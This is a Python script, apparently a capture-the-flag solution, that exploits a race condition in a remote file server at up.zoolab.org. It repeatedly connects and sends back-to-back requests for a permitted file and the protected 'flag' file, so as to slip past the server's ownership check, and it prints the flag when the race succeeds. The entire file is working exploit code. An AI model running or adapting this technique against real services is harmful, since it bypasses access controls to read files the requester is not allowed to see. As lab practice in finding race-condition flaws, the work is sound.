import socket
import time
import sys

HOST = "up.zoolab.org"
PORT = 10931

# Files to alternate requests for
file1 = b"fortune000\n" # A file owned by user 1000
file2 = b"flag\n"       # The target file

count = 0
while True:
    count += 1
    print(f"Attempt {count}")
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            response = s.recv(1024) 
            response = s.recv(1024)

            # Send the two requests back-to-back
            s.sendall(file1)
            s.sendall(file2)
            
            # Give a short time for the server to process and respond
            s.settimeout(5.0) # Set a timeout for reading response
            try:
                response = s.recv(4096)
                response_str = response.decode('utf-8', errors='ignore')
                if "race" in response_str:
                    print(response_str)
                    sys.exit(0)
            except socket.timeout:
                print("Socket timed out waiting for response.")
            except Exception as e:
                print(f"Error reading response: {e}")
                

    except ConnectionRefusedError:
        print(f"Connection refused to {HOST}:{PORT}. Server down?")
        time.sleep(2)
    except socket.gaierror:
        print(f"Could not resolve hostname: {HOST}")
        break 
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(0.1) # Small delay before retrying

    # Optional small delay between attempts
    # time.sleep(0.05)